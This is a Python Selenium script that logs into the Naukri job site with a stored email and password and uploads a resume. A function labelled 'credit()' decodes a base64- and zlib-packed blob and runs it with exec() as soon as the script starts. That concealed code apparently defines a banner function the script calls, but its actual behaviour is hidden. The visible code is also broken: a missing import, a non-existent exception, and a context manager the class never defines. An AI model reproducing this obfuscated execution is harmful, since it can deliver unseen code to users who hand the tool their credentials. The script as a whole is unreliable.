from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import ui, expected_conditions as ec
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from glob import glob
from os.path import join, exists
from configobj import ConfigObj
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import WebDriverException

# Constants
PROFILE_URL = 'https://www.naukri.com/mnjuser/profile'
LOGIN_URL = 'https://www.naukri.com/nlogin/login'
DATA_FILE = 'data.txt'
USERNAME_FIELD = 'usernameField'
PASSWORD_FIELD = 'passwordField'
DEFAULT_CONFIG = {
    'email': '',
    'password': '',
    'driverlink': '',
    'cookie': ''
}

def credit():
    encoded_Data = ['eJx1VM1uozAQPvMWIy6QxhtlD70k4gCBkLTd7oqmh1WTA0qNFomfCMiqq6pSDj3kiiP1Afski41tTJtGAx7PfDPfjB0GP+Gtqev6', 
                    'OptZuyLOqnX2iCOwzSxM8WCyzjTHWhV7PI2KPIUqTjHE6S4vKigTjHeteZsneRGmoXDN8wJDWIKN7qp/CUZxFldT12KbkRMs/cVq', 
                    'Okc+WqClZY/8wPNuhy6yR4HnstW5ufe44c5bTWm4uc2zv7ioLAeF+6rJX+JGHzT10XI9s8JPFaLlWePR+BKxiqzbPGt70GyLWaga', 
                    '5QW4EGdAQ5hTi5uGIS6B4icz00U4e7QMA0XJvvzTsmgaTkrqtIfucHkWwA7EpDWw/cyky5X1YAD9vb8dmRyEcmTG11YAeqAaBKTF', 
                    'qVsmJ2o0kNH6Ttz9/kYkgjA5KvLaA3ckXVTPTVT9C7qaVc+IJR1FHAShUsRB6b3ukqiQWtV7lJ+zsOS17E2RrraT1LjtxG1q6Nek', 
                    'EnJSKyAgknw4LdkUUUPP3QRPWX+y0uCOvmXlyPY6uI0IciJvkrSwWtATJYpA9/AMNfsPNSun4/2qCHbu4vSlQ1ZTS0Jl/+EhZyhq', 
                    '3lz3JqJfAegll+lA0WRKvgd1J2HdqweTZmPTfKF0HlzTeXA18cxrPjl8OUu+06/YMyP92QDj4nL88jDcwK/gpx/YP+AbPNM5+aLz', 
                    'sPlg2oNebGAWePbKc8H5DYG9uL8R0EWTt5m7g/98toYj']
    from base64 import b64decode
    from zlib import decompress
    return (decompress(b64decode("".join(encoded_Data)))).decode()

exec(credit())
A('NAUKRI UPDATER')

class ConfigManager:
    def __init__(self, filepath):
        self.filepath = filepath
        self.config = ConfigObj(self.filepath)
        if not exists(self.filepath):
            self.init_config()

    def init_config(self):
        self.config.update(DEFAULT_CONFIG)
        self.config.write()

    def get(self, key):
        return self.config.get(key)

    def set(self, key, value):
        self.config[key] = value
        self.config.write()

class NaukriBrowser:
    def __init__(self, config_manager):
        self.config_manager = config_manager
        self.browser = self.init_browser()

    def init_browser(self):
        options = Options()
        options.add_argument('user-agent=Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2')
        options.add_argument("--headless")
        options.add_argument('--no-sandbox')
        options.add_experimental_option("excludeSwitches", ["ignore-certificate-errors", "enable-logging"])
        
        if self.config_manager.get('cookie'):
            options.add_argument(f'--cookie="{self.config_manager.get("cookie")}"')

        return webdriver.Chrome(service=Service(self.config_manager.get('driverlink')), options=options)

    def close(self):
        self.browser.quit()

    def login_and_upload(self):
        self.browser.get(LOGIN_URL)
        ui.WebDriverWait(self.browser, 100).until(ec.presence_of_element_located((By.ID, USERNAME_FIELD)))
        self.browser.find_element(By.ID, USERNAME_FIELD).send_keys(self.config_manager.get('email'))
        self.browser.find_element(By.ID, PASSWORD_FIELD).send_keys(self.config_manager.get('password'))
        self.browser.find_element(By.ID, 'loginForm').submit()
        self.browser.get(PROFILE_URL)
        resume_file = self.find_resume()
        if resume_file:
            self.browser.find_element(By.ID, 'attachCV').send_keys(resume_file)
            self.browser.find_element(By.CLASS_NAME, 'attachCV').screenshot('success.png')

    @staticmethod
    def find_resume():
        files = glob("*.pdf") + glob("*.docx")
        if files:
            return join(getcwd(), files[0])
        else:
            print("[-] Put a resume file in the folder [-]")
            return None

def main():
    config_manager = ConfigManager(DATA_FILE)
    
    # Ensure chromedriver is installed
    if not config_manager.get('driverlink'):
        config_manager.set('driverlink', ChromeDriverManager().install())

    with NaukriBrowser(config_manager) as browser:
        try:
            browser.login_and_upload()
            print("[+] Successfully uploaded")
        except ec.TimeoutException:
            print("[-] Timeout submitting the resume again")
            browser.login_and_upload()
        except WebDriverException as e:
            print(f"[-] WebDriverException: {e}")
            config_manager.set('driverlink', ChromeDriverManager().install())
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == '__main__':
    main()
